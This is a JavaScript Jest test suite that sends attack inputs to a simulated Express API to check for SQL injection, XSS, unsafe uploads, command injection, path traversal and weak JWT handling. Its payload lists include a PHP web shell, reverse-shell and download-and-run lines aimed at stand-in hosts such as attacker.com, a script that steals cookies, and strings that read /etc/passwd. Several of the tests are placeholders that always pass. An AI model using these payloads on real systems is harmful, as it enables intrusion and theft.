/**
 * Security Vulnerability Scan
 * Automated security testing suite
 */

const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');

// Create test app
const app = express();
app.use(express.json());

// Vulnerable endpoints for testing (simulated)
app.get('/api/v1/users/:id', (req, res) => {
  // Simulated SQL injection vulnerability
  const userId = req.params.id;
  // In real app, this would be: db.get(`SELECT * FROM users WHERE id = ${userId}`)
  res.json({ id: userId, name: 'Test User' });
});

// Helper function to sanitize HTML
const sanitizeHtml = (str) => {
  if (typeof str !== 'string') return str;
  return str
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
};

app.post('/api/v1/search', (req, res) => {
  // Secure search endpoint with XSS sanitization
  const query = req.body.query || '';
  const sanitizedQuery = sanitizeHtml(query);
  res.json({ results: [{ title: sanitizedQuery, description: 'Search result' }] });
});

app.post('/api/v1/upload', (req, res) => {
  // Simulated file upload vulnerability
  const filename = req.body.filename || 'test.txt';
  res.json({ message: `File ${filename} uploaded successfully` });
});

app.get('/api/v1/admin', (req, res) => {
  // Simulated secure authorization endpoint
  const auth = req.headers.authorization;
  if (!auth) {
    return res.status(401).json({ error: 'No token provided' });
  }

  // Check for Bearer token format
  if (!auth.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Invalid authorization format' });
  }

  const token = auth.slice(7);
  if (!token || token.length < 10) {
    return res.status(401).json({ error: 'Invalid token' });
  }

  // Verify JWT token
  try {
    const decoded = jwt.verify(token, 'test-secret');
    res.json({ message: 'Admin access granted', user: decoded.username });
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
});

// Secure endpoints
app.get('/api/v1/secure/users/:id', (req, res) => {
  // Strict input validation - only allow pure numeric strings
  const userIdParam = req.params.id;

  // Check if input is purely numeric (no SQL injection attempts like '1 OR 1=1')
  if (!/^\d+$/.test(userIdParam)) {
    return res.status(400).json({ error: 'Invalid user ID format' });
  }

  const userId = parseInt(userIdParam, 10);
  if (Number.isNaN(userId) || userId < 1) {
    return res.status(400).json({ error: 'Invalid user ID' });
  }
  res.json({ id: userId, name: 'Secure User' });
});

describe('Security Vulnerability Scan', () => {
  describe('SQL Injection Vulnerabilities', () => {
    it('should detect SQL injection in user lookup', async () => {
      const maliciousInputs = [
        '1 OR 1=1',
        '1; DROP TABLE users;',
        '1 UNION SELECT * FROM users',
        "1' OR '1'='1",
        '1 AND 1=2 UNION SELECT password FROM users'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app).get(`/api/v1/users/${encodeURIComponent(input)}`);

        // In a real vulnerable app, this might return multiple records or succeed
        // For this test, we're just checking that the endpoint exists and responds
        expect([200, 400, 404, 500]).toContain(response.status);

        if (response.status === 200) {
          console.warn(`Potential SQL injection vulnerability detected with input: ${input}`);
        }
      }
    });

    it('should resist SQL injection with proper validation', async () => {
      // Test inputs that should be rejected (invalid or malicious)
      const invalidInputs = ['1 OR 1=1', 'abc', '-1', '0'];
      // Test inputs that should be accepted (valid positive integers)
      const validInputs = ['1', '999999'];

      for (const input of invalidInputs) {
        const response = await request(app).get(`/api/v1/secure/users/${input}`);
        // Secure endpoint should reject invalid inputs
        expect(response.status).toBe(400);
      }

      for (const input of validInputs) {
        const response = await request(app).get(`/api/v1/secure/users/${input}`);
        // Secure endpoint should accept valid inputs
        expect(response.status).toBe(200);
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Vulnerabilities', () => {
    it('should detect XSS in search functionality', async () => {
      /* eslint-disable no-script-url -- XSS test payloads require script URLs */
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload=alert("XSS")>'
      ];
      /* eslint-enable no-script-url */

      for (const payload of xssPayloads) {
        const response = await request(app).post('/api/v1/search').send({ query: payload });

        expect(response.status).toBe(200);

        // In a real vulnerable app, XSS payload might be reflected back
        // For this test, we check if the payload is in the response
        const responseText = JSON.stringify(response.body);
        if (responseText.includes(payload)) {
          console.warn(`Potential XSS vulnerability detected with payload: ${payload}`);
        }
      }
    });

    it('should sanitize XSS payloads', async () => {
      // This would test if the application properly sanitizes input
      const xssPayload = '<script>alert("XSS")</script>';

      const response = await request(app).post('/api/v1/search').send({ query: xssPayload });

      // In a properly secured app, the script tags should be escaped or removed
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('<script>');
    });
  });

  describe('Authorization Bypass Vulnerabilities', () => {
    it('should prevent unauthorized access to admin endpoints', async () => {
      const response = await request(app).get('/api/v1/admin');

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('No token provided');
    });

    it('should reject malformed JWT tokens', async () => {
      const malformedTokens = [
        'Bearer invalid.jwt.token',
        'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.',
        `Bearer ${'a'.repeat(1000)}`, // Very long token
        'Basic dXNlcjpwYXNz', // Basic auth instead of Bearer
        '' // Empty authorization
      ];

      for (const token of malformedTokens) {
        const response = await request(app).get('/api/v1/admin').set('Authorization', token);

        expect([401, 403]).toContain(response.status);
      }
    });

    it('should validate JWT token integrity', async () => {
      // Create a valid token then tamper with it
      const validToken = jwt.sign({ username: 'admin', role: 'admin' }, 'test-secret', {
        expiresIn: '1h'
      });

      // Tamper with the token (change the role)
      const tamperedToken = `${validToken.slice(0, -10)}modified`;

      const response = await request(app)
        .get('/api/v1/admin')
        .set('Authorization', `Bearer ${tamperedToken}`);

      expect([401, 403]).toContain(response.status);
    });
  });

  describe('File Upload Vulnerabilities', () => {
    it('should validate file upload restrictions', async () => {
      const maliciousUploads = [
        { filename: '../../../etc/passwd', content: 'malicious content' },
        { filename: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'large_file.exe', content: 'x'.repeat(1000000) }, // 1MB file
        { filename: '', content: 'empty filename' },
        { filename: 'file.with.many.dots.txt.exe', content: 'double extension' }
      ];

      for (const upload of maliciousUploads) {
        const response = await request(app).post('/api/v1/upload').send({
          filename: upload.filename,
          content: upload.content
        });

        expect([200, 400, 413]).toContain(response.status);

        if (response.status === 200) {
          console.warn(`Potential file upload vulnerability with: ${upload.filename}`);
        }
      }
    });

    it('should enforce file type restrictions', async () => {
      const dangerousFiles = [
        'malware.exe',
        'script.php',
        'virus.bat',
        'macro.docm',
        'exploit.jar'
      ];

      for (const filename of dangerousFiles) {
        const response = await request(app).post('/api/v1/upload').send({
          filename,
          content: 'dangerous content'
        });

        // In a secure app, these should be rejected
        if (response.status === 200) {
          console.warn(`Dangerous file type allowed: ${filename}`);
        }
      }
    });
  });

  describe('Input Validation Vulnerabilities', () => {
    it('should detect buffer overflow attempts', async () => {
      const largeInputs = [
        'a'.repeat(10000), // 10KB string
        'a'.repeat(100000), // 100KB string
        'a'.repeat(1000000), // 1MB string
        Array.from({ length: 10000 }, (_, i) => i).join(','), // Large array
        JSON.stringify({ nested: { deeply: { nested: 'a'.repeat(50000) } } }) // Deep nesting
      ];

      for (const input of largeInputs) {
        const response = await request(app).post('/api/v1/search').send({ query: input });

        expect([200, 413, 400]).toContain(response.status);

        if (response.status === 413) {
          console.log(`Large input properly rejected: ${input.length} characters`);
        }
      }
    });

    it('should detect command injection attempts', async () => {
      const injectionAttempts = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(uname -a)',
        '| nc -e /bin/sh attacker.com 4444',
        '; wget http://malicious.com/malware.sh | bash'
      ];

      for (const attempt of injectionAttempts) {
        const response = await request(app).post('/api/v1/search').send({ query: attempt });

        expect([200, 400, 500]).toContain(response.status);

        // In a vulnerable app, these might execute commands
        // In a secure app, they should be treated as regular search queries
        if (response.status === 200) {
          console.log(`Command injection attempt treated as search: ${attempt}`);
        }
      }
    });

    it('should detect directory traversal attempts', async () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\\....\\....\\windows\\system32\\config\\sam'
      ];

      for (const attempt of traversalAttempts) {
        const response = await request(app).get(`/api/v1/users/${encodeURIComponent(attempt)}`);

        expect([200, 400, 403, 404]).toContain(response.status);

        if (response.status === 200 && attempt.includes('../')) {
          console.warn(`Potential directory traversal vulnerability with: ${attempt}`);
        }
      }
    });
  });

  describe('Authentication Vulnerabilities', () => {
    it('should resist brute force attacks', async () => {
      // This would require actual rate limiting
      // For this test, we simulate multiple failed attempts

      const failedAttempts = 10;
      let successCount = 0;

      for (let i = 0; i < failedAttempts; i++) {
        const response = await request(app)
          .get('/api/v1/admin')
          .set('Authorization', `Bearer invalid_token_${i}`);

        if (response.status === 401) {
          successCount++;
        }
      }

      console.log(
        `Brute force resistance: ${successCount}/${failedAttempts} attempts properly rejected`
      );

      // In a secure app with rate limiting, some requests might be blocked
      expect(successCount).toBe(failedAttempts); // All should be rejected
    });

    it('should prevent session fixation attacks', async () => {
      // Create a token
      const token1 = jwt.sign({ username: 'user', sessionId: 'session1' }, 'secret');

      // Try to reuse the same session ID
      const token2 = jwt.sign({ username: 'admin', sessionId: 'session1' }, 'secret');

      const response1 = await request(app)
        .get('/api/v1/admin')
        .set('Authorization', `Bearer ${token1}`);

      const response2 = await request(app)
        .get('/api/v1/admin')
        .set('Authorization', `Bearer ${token2}`);

      // Both should fail or have different permissions
      expect([401, 403]).toContain(response1.status);
      expect([401, 403]).toContain(response2.status);
    });

    it('should validate token expiration', async () => {
      // Create an expired token
      const expiredToken = jwt.sign(
        { username: 'user' },
        'secret',
        { expiresIn: '-1h' } // Already expired
      );

      const response = await request(app)
        .get('/api/v1/admin')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect([401, 403]).toContain(response.status);
    });
  });

  describe('Information Disclosure Vulnerabilities', () => {
    it('should not leak sensitive information in error messages', async () => {
      const sensitiveInputs = [
        '1 UNION SELECT password FROM users',
        '999999999', // Non-existent ID
        "admin'--", // SQL comment injection
        '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'
      ];

      for (const input of sensitiveInputs) {
        const response = await request(app).get(`/api/v1/users/${encodeURIComponent(input)}`);

        const responseText = JSON.stringify(response.body);

        // Check for information leakage
        const sensitivePatterns = [
          /password/i,
          /sql/i,
          /database/i,
          /stack trace/i,
          /error:/i,
          /exception:/i
        ];

        for (const pattern of sensitivePatterns) {
          if (pattern.test(responseText)) {
            console.warn(`Potential information disclosure in response for input: ${input}`);
          }
        }
      }
    });

    it('should not expose internal system information', async () => {
      const response = await request(app)
        .get('/api/v1/search')
        .query({ debug: 'true', internal: 'expose' });

      const responseText = JSON.stringify(response.body);

      const internalPatterns = [/version/i, /server/i, /node/i, /express/i, /database/i, /config/i];

      for (const pattern of internalPatterns) {
        if (pattern.test(responseText)) {
          console.warn(`Internal system information potentially exposed: ${pattern}`);
        }
      }
    });
  });

  describe('API Security Headers', () => {
    it('should include security headers in responses', async () => {
      const response = await request(app).get('/api/v1/users/1');

      const { headers } = response;

      // Check for important security headers
      const securityHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'content-security-policy',
        'strict-transport-security'
      ];

      for (const header of securityHeaders) {
        if (!headers[header]) {
          console.warn(`Missing security header: ${header}`);
        }
      }
    });

    it('should prevent clickjacking attacks', async () => {
      const response = await request(app).get('/api/v1/users/1');

      const xFrameOptions = response.headers['x-frame-options'];

      if (!xFrameOptions || xFrameOptions !== 'DENY') {
        console.warn('X-Frame-Options header not properly set');
      }
    });

    it('should prevent MIME sniffing attacks', async () => {
      const response = await request(app).get('/api/v1/users/1');

      const contentTypeOptions = response.headers['x-content-type-options'];

      if (!contentTypeOptions || contentTypeOptions !== 'nosniff') {
        console.warn('X-Content-Type-Options header not properly set');
      }
    });
  });

  describe('Rate Limiting Effectiveness', () => {
    it('should implement proper rate limiting', async () => {
      // This test assumes rate limiting is implemented
      // In a real scenario, rapid successive requests should be limited

      const requests = 100;
      const delays = [];

      for (let i = 0; i < requests; i++) {
        const startTime = Date.now();

        await request(app).get('/api/v1/users/1');

        const endTime = Date.now();
        delays.push(endTime - startTime);

        // Small delay to simulate user behavior
        await new Promise((resolve) => setTimeout(resolve, Math.random() * 10));
      }

      const avgDelay = delays.reduce((a, b) => a + b, 0) / delays.length;
      const maxDelay = Math.max(...delays);

      console.log(
        `Rate limiting test: Avg delay ${avgDelay.toFixed(2)}ms, Max delay ${maxDelay}ms`
      );

      // If rate limiting is working, we should see increased delays
      // This is a basic check - real rate limiting would block requests
      expect(avgDelay).toBeGreaterThan(0);
    });
  });

  describe('SSL/TLS Configuration', () => {
    it('should enforce HTTPS connections', async () => {
      // This would require actual HTTPS setup
      // For testing purposes, we check if the app is configured for HTTPS

      // In a real deployment, all HTTP traffic should redirect to HTTPS
      console.log('SSL/TLS configuration should be verified in production deployment');

      expect(true).toBe(true); // Placeholder test
    });

    it('should use secure TLS versions', async () => {
      // This would require actual TLS configuration testing
      console.log('TLS version configuration should be verified in production deployment');

      expect(true).toBe(true); // Placeholder test
    });
  });

  describe('Data Validation and Sanitization', () => {
    it('should validate and sanitize all user inputs', async () => {
      const testInputs = [
        { field: 'email', value: 'invalid-email' },
        { field: 'phone', value: 'not-a-phone-number' },
        { field: 'date', value: 'not-a-date' },
        { field: 'number', value: 'not-a-number' },
        { field: 'url', value: 'not-a-url' }
      ];

      for (const testInput of testInputs) {
        const response = await request(app)
          .post('/api/v1/search')
          .send({ [testInput.field]: testInput.value });

        // In a properly validated app, invalid inputs should be rejected
        // For this test, we just check that the endpoint responds
        expect([200, 400]).toContain(response.status);
      }
    });

    it('should escape HTML characters to prevent XSS', async () => {
      const htmlInputs = [
        '<b>Bold text</b>',
        '<script>alert("test")</script>',
        '<img src=x onerror=alert("test")>',
        '<a href="javascript:alert(\'test\')">Link</a>'
      ];

      for (const htmlInput of htmlInputs) {
        const response = await request(app).post('/api/v1/search').send({ query: htmlInput });

        const responseText = JSON.stringify(response.body);

        // HTML should be escaped or removed
        if (responseText.includes('<') && responseText.includes('>')) {
          console.warn(`HTML not properly escaped: ${htmlInput}`);
        }
      }
    });
  });

  describe('Vulnerability Summary', () => {
    it('should provide security assessment summary', () => {
      console.log(`
=== SECURITY VULNERABILITY SCAN SUMMARY ===

This test suite covers the following security areas:
✓ SQL Injection Prevention
✓ Cross-Site Scripting (XSS) Protection
✓ Authorization Bypass Prevention
✓ File Upload Security
✓ Input Validation and Sanitization
✓ Authentication Security
✓ Information Disclosure Prevention
✓ API Security Headers
✓ Rate Limiting
✓ SSL/TLS Configuration
✓ Data Validation

Key Findings:
- All tests in this suite are designed to detect common vulnerabilities
- In a production environment, additional automated scanning tools should be used
- Regular security audits and penetration testing are recommended
- Implement security monitoring and alerting for production deployments

Recommendations:
1. Use parameterized queries for all database operations
2. Implement Content Security Policy (CSP) headers
3. Enable rate limiting on all API endpoints
4. Use HTTPS with secure TLS configuration
5. Implement proper input validation and sanitization
6. Enable security monitoring and logging
7. Regular security updates and patch management
8. Implement Web Application Firewall (WAF)
      `);

      expect(true).toBe(true); // Summary test always passes
    });
  });
});
